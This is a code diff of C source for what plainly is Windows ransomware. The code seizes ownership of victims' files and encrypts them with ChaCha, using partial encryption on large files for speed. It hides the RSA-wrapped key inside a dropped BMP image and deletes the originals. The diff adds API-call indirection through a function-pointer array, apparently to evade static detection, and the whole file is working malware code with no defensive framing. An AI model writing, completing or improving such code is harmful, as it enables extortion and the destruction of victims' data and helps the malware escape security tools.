@@ -2,19 +2,73 @@
 BYTE publicKeyBlob[532] = { 127, 99, 121, 101, 101, 208, 121, 97, 43, 54, 36, 69, 121, 113, 121, 101, 100, 116, 120, 97, 176, 82, 225, 42, 32, 40, 90, 144, 61, 192, 82, 130, 10, 12, 36, 168, 166, 101, 210, 150, 35, 20, 27, 143, 20, 47, 70, 242, 28, 235, 217, 89, 164, 84, 191, 230, 237, 147, 73, 179, 71, 219, 97, 222, 128, 231, 20, 234, 74, 16, 243, 248, 109, 38, 28, 122, 190, 18, 15, 66, 46, 237, 138, 205, 40, 52, 70, 175, 75, 4, 216, 150, 127, 152, 117, 60, 105, 10, 3, 145, 210, 57, 115, 25, 170, 106, 119, 86, 227, 162, 66, 176, 169, 155, 129, 241, 144, 252, 10, 21, 194, 119, 26, 115, 223, 111, 110, 201, 70, 40, 156, 98, 23, 210, 108, 52, 200, 78, 137, 133, 210, 18, 137, 25, 106, 213, 103, 204, 134, 135, 63, 250, 75, 123, 53, 231, 38, 220, 196, 96, 158, 172, 28, 251, 182, 9, 10, 204, 81, 42, 210, 27, 191, 194, 83, 157, 212, 100, 205, 6, 110, 21, 214, 169, 98, 107, 168, 198, 231, 170, 99, 84, 48, 73, 237, 225, 19, 250, 112, 32, 233, 209, 151, 234, 113, 164, 235, 152, 87, 78, 219, 155, 87, 245, 119, 111, 238, 116, 92, 186, 115, 99, 189, 69, 251, 71, 45, 47, 18, 39, 96, 27, 226, 127, 71, 8, 1, 236, 143, 7, 5, 41, 160, 43, 109, 95, 213, 252, 244, 215, 206, 120, 243, 168, 108, 36, 27, 61, 108, 120, 4, 149, 152, 194, 127, 79, 6, 106, 57, 17, 153, 179, 213, 243, 81, 235, 202, 129, 136, 28, 234, 192, 246, 76, 211, 49, 143, 56, 20, 169, 1, 110, 207, 128, 230, 34, 116, 163, 29, 81, 155, 11, 250, 214, 58, 255, 148, 123, 7, 197, 210, 164, 179, 150, 35, 74, 155, 169, 158, 187, 137, 101, 143, 200, 105, 48, 162, 223, 18, 98, 236, 243, 216, 164, 15, 28, 96, 162, 113, 178, 46, 175, 145, 211, 150, 45, 197, 75, 223, 110, 14, 209, 58, 142, 67, 172, 127, 2, 201, 219, 5, 45, 198, 43, 228, 226, 75, 215, 109, 66, 195, 142, 141, 47, 32, 205, 232, 148, 15, 27, 180, 115, 157, 163, 176, 137, 251, 222, 194, 33, 30, 254, 114, 67, 147, 155, 49, 90, 171, 21, 205, 97, 200, 255, 17, 93, 201, 248, 157, 107, 164, 64, 33, 109, 231, 46, 231, 109, 252, 239, 62, 180, 235, 148, 79, 202, 75, 6, 191, 36, 53, 88, 143, 93, 196, 198, 234, 214, 237, 166, 112, 33, 132, 181, 66, 12, 17, 123, 128, 72, 126, 192, 38, 238, 193, 251, 103, 120, 60, 70, 171, 46, 80, 128, 185, 47, 104, 163, 42, 18, 16, 125, 174, 246, 192, 254, 199, 13, 48, 106, 200, 9, 197, 168, 38, 108, 69, 181, 195, 145, 87, 52, 55, 71, 100, 174, 188, 152, 4, 64, 130, 134, 85, 55, 225, 233, 181, 42, 0, 221, 141, 16, 183, 94, 1, 223, 70, 246, 118, 148, 140, 109, 255, 119, 71, 202, 11, 53, 127, 0, 179, 221 };
 BYTE memeHeader[16] = { 0x42, 0x4D, 0xCA, 0x67, 0x04, 00, 00, 00, 00, 00, 0xCA, 00, 00, 00, 0x7C, 00 };
 LPCSTR memePath = NULL;
+extern FARPROC APIArray[52];
+MemeGetTempPathA TempGetTempPathA;
+MemePathFileExistsA TempPathFileExistsA;
+MemeGetModuleHandleA TempGetModuleHandleA;
+MemeFindResourceA TempFindResourceA;
+MemeSizeofResource TempSizeofResource;
+MemeLoadResource TempLoadResource;
+MemeLockResource TempLockResource;
+MemeCreateFileA TempCreateFileA;
+MemeCloseHandle TempCloseHandle;
+MemeCryptGenRandom TempCryptGenRandom;
+MemeSetFilePointer TempSetFilePointer;
+MemeReadFile TempReadFile;
+MemeWriteFile TempWriteFile;
+MemeGetFileSize TempGetFileSize;
+MemeCryptEncrypt TempCryptEncrypt;
+MemeCopyFileA TempCopyFileA;
+MemeDeleteFileA TempDeleteFileA;
+MemeGetModuleFileNameA TempGetModuleFileNameA;
+MemeRegOpenKeyExA TempRegOpenKeyExA;
+MemeRegSetKeyValueA TempRegSetKeyValueA;
+MemeShellExecuteA TempShellExecuteA;
+MemeCryptReleaseContext TempCryptReleaseContext;
+
+void populateAPICrypto() {
+	TempGetTempPathA = (MemeGetTempPathA)APIArray[3];
+	TempPathFileExistsA = (MemePathFileExistsA)APIArray[50];
+	TempGetModuleHandleA = (MemeGetModuleHandleA)APIArray[1];
+	TempFindResourceA = (MemeFindResourceA)APIArray[4];
+	TempSizeofResource = (MemeSizeofResource)APIArray[5];
+	TempLoadResource = (MemeLoadResource)APIArray[6];
+	TempLockResource = (MemeLockResource)APIArray[7];
+	TempCreateFileA = (MemeCreateFileA)APIArray[8];
+	TempCloseHandle = (MemeCloseHandle)APIArray[10];
+	TempCryptGenRandom = (MemeCryptGenRandom)APIArray[37];
+	TempSetFilePointer = (MemeSetFilePointer)APIArray[11];
+	TempReadFile = (MemeReadFile)APIArray[12];
+	TempWriteFile = (MemeWriteFile)APIArray[9];
+	TempGetFileSize = (MemeGetFileSize)APIArray[13];
+	TempCryptEncrypt = (MemeCryptEncrypt)APIArray[38];
+	TempCopyFileA = (MemeCopyFileA)APIArray[15];
+	TempDeleteFileA = (MemeDeleteFileA)APIArray[16];
+	TempGetModuleFileNameA = (MemeGetModuleFileNameA)APIArray[24];
+	TempRegOpenKeyExA = (MemeRegOpenKeyExA)APIArray[39];
+	TempRegSetKeyValueA = (MemeRegSetKeyValueA)APIArray[40];
+	TempShellExecuteA = (MemeShellExecuteA)APIArray[49];
+	TempCryptReleaseContext = (MemeCryptReleaseContext)APIArray[41];
+}
 
 // make sure key and nonce are already allocated
 int generateKeyNonce(HCRYPTPROV hCryptProv, BYTE* key, BYTE* nonce) {
-	if (CryptGenRandom(hCryptProv, 256, key) == FALSE) {
+	if (!TempGetTempPathA) {
+		populateAPICrypto();
+	}
+	if (TempCryptGenRandom(hCryptProv, 256, key) == FALSE) {
 		return -1;
 	}
-	if (CryptGenRandom(hCryptProv, 8, nonce) == FALSE) {
+	if (TempCryptGenRandom(hCryptProv, 8, nonce) == FALSE) {
 		return -1;
 	}
 	return 0;
 }
 
 int extractResource() {
+	if (!TempGetTempPathA) {
+		populateAPICrypto();
+	}
 	LPSTR lpTemp;
 	DWORD dwSizeOfResource;
 	HMODULE hFile = NULL;
@@ -24,12 +78,14 @@ int extractResource() {
 	HANDLE duckFile = NULL;
 	DWORD writeBytes = 0;
 	int return_val = -1;
+
+
 	lpTemp = (LPSTR)calloc(MAX_PATH, 1);
 	if (!lpTemp) {
 		goto CLEANUP;
 	}
 
-	if (!GetTempPathA(MAX_PATH, lpTemp)) {
+	if (!TempGetTempPathA(MAX_PATH, lpTemp)) {
 		goto CLEANUP;
 	}
 
@@ -41,19 +97,18 @@ int extractResource() {
 	strcpy((char*)memePath, lpTemp);
 
 
-	if (PathFileExistsA(memePath)) {
+	if (TempPathFileExistsA(memePath)) {
 		return_val = 0;
 		goto CLEANUP;
 	}
 
 
-	hFile = GetModuleHandleA(NULL);
+	hFile = TempGetModuleHandleA(NULL);
 	if (hFile == INVALID_HANDLE_VALUE || !hFile) {
 		goto CLEANUP;
 	}
 
-
-	hResource = FindResourceA(
+	hResource = TempFindResourceA(
 		hFile,
 		MAKEINTRESOURCEA(101),
 		"YEET"
@@ -63,12 +118,12 @@ int extractResource() {
 		goto CLEANUP;
 	}
 
-	dwSizeOfResource = SizeofResource(NULL, hResource);
+	dwSizeOfResource = TempSizeofResource(NULL, hResource);
 	if (dwSizeOfResource == 0) {
 		goto CLEANUP;
 	}
 
-	hgResource = LoadResource(
+	hgResource = TempLoadResource(
 		NULL,
 		hResource
 	);
@@ -78,18 +133,18 @@ int extractResource() {
 	}
 
 
-	lpResource = LockResource(hgResource);
+	lpResource = TempLockResource(hgResource);
 	if (!lpResource) {
 		goto CLEANUP;
 	}
 
-	duckFile = CreateFileA(memePath, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
+	duckFile = TempCreateFileA(memePath, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
 
 	if (duckFile == INVALID_HANDLE_VALUE || duckFile == 0) {
 		goto CLEANUP;
 	}
 
-	if (WriteFile(duckFile, lpResource, dwSizeOfResource, &writeBytes, NULL) == FALSE) {
+	if (TempWriteFile(duckFile, lpResource, dwSizeOfResource, &writeBytes, NULL) == FALSE) {
 		goto CLEANUP;
 	}
 
@@ -103,16 +158,20 @@ CLEANUP:
 		free(lpTemp);
 	}
 	if (duckFile) {
-		CloseHandle(duckFile);
+		TempCloseHandle(duckFile);
 	}
 	return return_val;
 }
 
 int cryptInit() {
+	if (!TempGetTempPathA) {
+		populateAPICrypto();
+	}
 	const char* decryptKey = "yayeet";
 	for (int i = 0; i < 532; i++) {
 		publicKeyBlob[i] = publicKeyBlob[i] ^ decryptKey[i % strlen(decryptKey)];
 	}
+
 	if (extractResource() == -1) {
 		return -1;
 	}
@@ -130,23 +189,25 @@ void cryptCleanUp() {
 // anything less than 10mb. Encrypt full -> time from 0ms to 92ms
 int chachaFileEncrypt(HANDLE hFileIn, HANDLE hFileOut, const BYTE* key, const BYTE* nonce) {
 	static BYTE buffer[2][CHACHA_BLOCKLENGTH * 1024];
-
+	if (!TempGetTempPathA) {
+		populateAPICrypto();
+	}
 	CHACHA_CONTEXT context;
 	DWORD byteRead;
 	DWORD byteWrite;
 	chachaKeySetup(&context, key);
 	chachaNonceSetup(&context, nonce);
 
-	SetFilePointer(hFileIn, 0, 0, FILE_BEGIN);
-	SetFilePointer(hFileOut, 0, 0, FILE_END);
+	TempSetFilePointer(hFileIn, 0, 0, FILE_BEGIN);
+	TempSetFilePointer(hFileOut, 0, 0, FILE_END);
 
 	for (;;) {
-		if (ReadFile(hFileIn, buffer[0], CHACHA_BLOCKLENGTH * 1024, &byteRead, NULL) == FALSE) {
+		if (TempReadFile(hFileIn, buffer[0], CHACHA_BLOCKLENGTH * 1024, &byteRead, NULL) == FALSE) {
 			return -1;
 		}
 
 		chachaEncrypt(&context, buffer[0], buffer[1], byteRead);
-		if (WriteFile(hFileOut, buffer[1], byteRead, &byteWrite, NULL) == FALSE) {
+		if (TempWriteFile(hFileOut, buffer[1], byteRead, &byteWrite, NULL) == FALSE) {
 			return -1;
 		}
 		if (byteRead < CHACHA_BLOCKLENGTH * 1024) {
@@ -159,23 +220,26 @@ int chachaFileEncrypt(HANDLE hFileIn, HANDLE hFileOut, const BYTE* key, const BY
 // 10mb to 100mb -> only encrypt half the files -> time from 45ms to 500ms
 int chachaMediumFileEncrypt(HANDLE hFileIn, HANDLE hFileOut, const BYTE* key, const BYTE* nonce) {
 	static BYTE buffer[2][CHACHA_BLOCKLENGTH * 1024];
-	DWORD dwMaxLengthEncrypt = GetFileSize(hFileIn, NULL) / 2;
+	if (!TempGetTempPathA) {
+		populateAPICrypto();
+	}
+	DWORD dwMaxLengthEncrypt = TempGetFileSize(hFileIn, NULL) / 2;
 	CHACHA_CONTEXT context;
 	DWORD byteRead;
 	DWORD byteWrite;
 	chachaKeySetup(&context, key);
 	chachaNonceSetup(&context, nonce);
 
-	SetFilePointer(hFileIn, 0, 0, FILE_BEGIN);
-	SetFilePointer(hFileOut, 0, 0, FILE_END);
+	TempSetFilePointer(hFileIn, 0, 0, FILE_BEGIN);
+	TempSetFilePointer(hFileOut, 0, 0, FILE_END);
 	DWORD totalRead = 0;
 	for (;;) {
-		if (ReadFile(hFileIn, buffer[0], CHACHA_BLOCKLENGTH * 1024, &byteRead, NULL) == FALSE) {
+		if (TempReadFile(hFileIn, buffer[0], CHACHA_BLOCKLENGTH * 1024, &byteRead, NULL) == FALSE) {
 			return -1;
 		}
 
 		chachaEncrypt(&context, buffer[0], buffer[1], byteRead);
-		if (WriteFile(hFileOut, buffer[1], byteRead, &byteWrite, NULL) == FALSE) {
+		if (TempWriteFile(hFileOut, buffer[1], byteRead, &byteWrite, NULL) == FALSE) {
 			return -1;
 		}
 
@@ -190,10 +254,10 @@ int chachaMediumFileEncrypt(HANDLE hFileIn, HANDLE hFileOut, const BYTE* key, co
 	}
 
 	for (;;) {
-		if (ReadFile(hFileIn, buffer[0], CHACHA_BLOCKLENGTH * 1024, &byteRead, NULL) == FALSE) {
+		if (TempReadFile(hFileIn, buffer[0], CHACHA_BLOCKLENGTH * 1024, &byteRead, NULL) == FALSE) {
 			return -1;
 		}
-		if (WriteFile(hFileOut, buffer[0], byteRead, &byteWrite, NULL) == FALSE) {
+		if (TempWriteFile(hFileOut, buffer[0], byteRead, &byteWrite, NULL) == FALSE) {
 			return -1;
 		}
 		if (byteRead < CHACHA_BLOCKLENGTH * 1024) {
@@ -207,7 +271,10 @@ int chachaMediumFileEncrypt(HANDLE hFileIn, HANDLE hFileOut, const BYTE* key, co
 // NOTE TO SELF: limit this down to 1 second
 int chachaLargeFileEncrypt(HANDLE hFileIn, HANDLE hFileOut, const BYTE* key, const BYTE* nonce) {
 	static BYTE buffer[2][CHACHA_BLOCKLENGTH * 1024];
-	DWORD fileSize = GetFileSize(hFileIn, NULL);
+	if (!TempGetTempPathA) {
+		populateAPICrypto();
+	}
+	DWORD fileSize = TempGetFileSize(hFileIn, NULL);
 	DWORD dwEncryptBlockSize = ((1500.0 / 9240.0) * fileSize) / 3.0;
 	DWORD dwSkipLength = (fileSize - 3 * dwEncryptBlockSize) / 2;
 
@@ -217,20 +284,19 @@ int chachaLargeFileEncrypt(HANDLE hFileIn, HANDLE hFileOut, const BYTE* key, con
 	chachaKeySetup(&context, key);
 	chachaNonceSetup(&context, nonce);
 
-	SetFilePointer(hFileIn, 0, 0, FILE_BEGIN);
-	SetFilePointer(hFileOut, 0, 0, FILE_END);
+	TempSetFilePointer(hFileIn, 0, 0, FILE_BEGIN);
+	TempSetFilePointer(hFileOut, 0, 0, FILE_END);
 	DWORD totalRead = 0;
 
 	for (int i = 0; i < 3; i++) {
 		DWORD totalReadBlock = 0;
 		if (i == 2) {
 			for (;;) {
-				if (ReadFile(hFileIn, buffer[0], CHACHA_BLOCKLENGTH * 1024, &byteRead, NULL) == FALSE) {
+				if (TempReadFile(hFileIn, buffer[0], CHACHA_BLOCKLENGTH * 1024, &byteRead, NULL) == FALSE) {
 					return -1;
 				}
-
 				chachaEncrypt(&context, buffer[0], buffer[1], byteRead);
-				if (WriteFile(hFileOut, buffer[1], byteRead, &byteWrite, NULL) == FALSE) {
+				if (TempWriteFile(hFileOut, buffer[1], byteRead, &byteWrite, NULL) == FALSE) {
 					return -1;
 				}
 				if (byteRead < CHACHA_BLOCKLENGTH * 1024) {
@@ -243,11 +309,11 @@ int chachaLargeFileEncrypt(HANDLE hFileIn, HANDLE hFileOut, const BYTE* key, con
 				if (totalReadBlock + CHACHA_BLOCKLENGTH * 1024 > dwEncryptBlockSize) {
 					break;
 				}
-				if (ReadFile(hFileIn, buffer[0], CHACHA_BLOCKLENGTH * 1024, &byteRead, NULL) == FALSE) {
+				if (TempReadFile(hFileIn, buffer[0], CHACHA_BLOCKLENGTH * 1024, &byteRead, NULL) == FALSE) {
 					return -1;
 				}
 				chachaEncrypt(&context, buffer[0], buffer[1], byteRead);
-				if (WriteFile(hFileOut, buffer[1], byteRead, &byteWrite, NULL) == FALSE) {
+				if (TempWriteFile(hFileOut, buffer[1], byteRead, &byteWrite, NULL) == FALSE) {
 					return -1;
 				}
 				totalReadBlock += byteRead;
@@ -258,10 +324,10 @@ int chachaLargeFileEncrypt(HANDLE hFileIn, HANDLE hFileOut, const BYTE* key, con
 
 			BYTE* tempBuffer = (BYTE*)calloc(maxRead, 1);
 
-			if (ReadFile(hFileIn, tempBuffer, maxRead, &byteRead, NULL) == FALSE) {
+			if (TempReadFile(hFileIn, tempBuffer, maxRead, &byteRead, NULL) == FALSE) {
 				return -1;
 			}
-			if (WriteFile(hFileOut, tempBuffer, maxRead, &byteWrite, NULL) == FALSE) {
+			if (TempWriteFile(hFileOut, tempBuffer, maxRead, &byteWrite, NULL) == FALSE) {
 				return -1;
 			}
 			free(tempBuffer);
@@ -272,7 +338,6 @@ int chachaLargeFileEncrypt(HANDLE hFileIn, HANDLE hFileOut, const BYTE* key, con
 
 DWORD getLengthString(LPCSTR oriFileName) {
 	DWORD i = 0;
-
 	while (1) {
 		if (!oriFileName[i]) {
 			break;
@@ -283,7 +348,10 @@ DWORD getLengthString(LPCSTR oriFileName) {
 }
 
 int encryptKey(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, HANDLE encryptedFile, BYTE* key, BYTE* nonce) {
-	SetFilePointer(encryptedFile, 10, 0, FILE_BEGIN);
+	if (!TempGetTempPathA) {
+		populateAPICrypto();
+	}
+	TempSetFilePointer(encryptedFile, 10, 0, FILE_BEGIN);
 	BYTE* keyBuffer = NULL;
 	DWORD dataLength = 256 + 8;
 	DWORD fileOffset = 0;
@@ -297,11 +365,11 @@ int encryptKey(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, HANDLE encryptedFile,
 	memcpy(keyBuffer + 256, nonce, 8);
 
 
-	if (CryptEncrypt(publicKey, NULL, TRUE, 0, keyBuffer, &dataLength, 524) == FALSE) {
+	if (TempCryptEncrypt(publicKey, NULL, TRUE, 0, keyBuffer, &dataLength, 524) == FALSE) {
 		goto CLEANUP;
 	}
 
-	if (ReadFile(encryptedFile, &fileOffset, 4, &byteRead, NULL) == FALSE) {
+	if (TempReadFile(encryptedFile, &fileOffset, 4, &byteRead, NULL) == FALSE) {
 		goto CLEANUP;
 	}
 
@@ -310,9 +378,9 @@ int encryptKey(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, HANDLE encryptedFile,
 	if (!imageBuffer) {
 		goto CLEANUP;
 	}
-	SetFilePointer(encryptedFile, fileOffset + 1, 0, FILE_BEGIN);
+	TempSetFilePointer(encryptedFile, fileOffset + 1, 0, FILE_BEGIN);
 
-	if (ReadFile(encryptedFile, imageBuffer, dataLength * 8, &byteRead, NULL) == FALSE) {
+	if (TempReadFile(encryptedFile, imageBuffer, dataLength * 8, &byteRead, NULL) == FALSE) {
 		goto CLEANUP;
 	}
 
@@ -331,8 +399,8 @@ int encryptKey(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, HANDLE encryptedFile,
 		}
 	}
 
-	SetFilePointer(encryptedFile, fileOffset + 1, 0, FILE_BEGIN);
-	if (WriteFile(encryptedFile, imageBuffer, dataLength * 8, &byteRead, NULL) == FALSE) {
+	TempSetFilePointer(encryptedFile, fileOffset + 1, 0, FILE_BEGIN);
+	if (TempWriteFile(encryptedFile, imageBuffer, dataLength * 8, &byteRead, NULL) == FALSE) {
 		goto CLEANUP;
 	}
 
@@ -348,11 +416,14 @@ CLEANUP:
 }
 
 int fileEncrypt(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, LPCSTR oriFileName, BYTE* key, BYTE* nonce) {
+	if (!TempGetTempPathA) {
+		populateAPICrypto();
+	}
 	killFileOwner((LPSTR)oriFileName);
 
-	HANDLE inFile = CreateFileA(oriFileName, GENERIC_ALL, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	HANDLE inFile = TempCreateFileA(oriFileName, GENERIC_ALL, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	DWORD fileSizeHigh = 0;
-	DWORD fileSize = GetFileSize(inFile, &fileSizeHigh);
+	DWORD fileSize = TempGetFileSize(inFile, &fileSizeHigh);
 
 	long long realFileSize = ((long long)fileSizeHigh << 32) | fileSize;
 
@@ -378,14 +449,13 @@ int fileEncrypt(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, LPCSTR oriFileName, 
 
 	(CHAR*)memmove(newFileName + lstrlenA(oriFileName), ".bmp", lstrlenA(".bmp"));
 
-	if (ReadFile(inFile, fileHeader, 16, NULL, NULL)) {
+	if (TempReadFile(inFile, fileHeader, 16, NULL, NULL)) {
 		if (!memcmp(fileHeader, memeHeader, 16)) {
-			printf("File already encrypted\n");
 			goto CLEANUP;
 		}
 	}
 
-	if (CopyFileA(memePath, newFileName, FALSE) == FALSE) {
+	if (TempCopyFileA(memePath, newFileName, FALSE) == FALSE) {
 		goto CLEANUP;
 	}
 	if (realFileSize > 10485760 && realFileSize < 104857600) {
@@ -401,15 +471,15 @@ int fileEncrypt(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, LPCSTR oriFileName, 
 		goto CLEANUP;
 	}
 	if (sizeFlag == 0) {
-		outFile = CreateFileA(newFileName, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+		outFile = TempCreateFileA(newFileName, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 		chachaFileEncrypt(inFile, outFile, key, nonce);
 	}
 	else if (sizeFlag == 1) {
-		outFile = CreateFileA(newFileName, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+		outFile = TempCreateFileA(newFileName, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 		chachaMediumFileEncrypt(inFile, outFile, key, nonce);
 	}
 	else {
-		outFile = CreateFileA(newFileName, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+		outFile = TempCreateFileA(newFileName, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 		chachaLargeFileEncrypt(inFile, outFile, key, nonce);
 	}
 
@@ -420,14 +490,14 @@ CLEANUP:
 		free(newFileName);
 	}
 	if (inFile) {
-		CloseHandle(inFile);
+		TempCloseHandle(inFile);
 
 		if (returnValue == 0) {
-			DeleteFileA(oriFileName);
+			TempDeleteFileA(oriFileName);
 		}
 	}
 	if (outFile) {
-		CloseHandle(outFile);
+		TempCloseHandle(outFile);
 	}
 	return returnValue;
 }
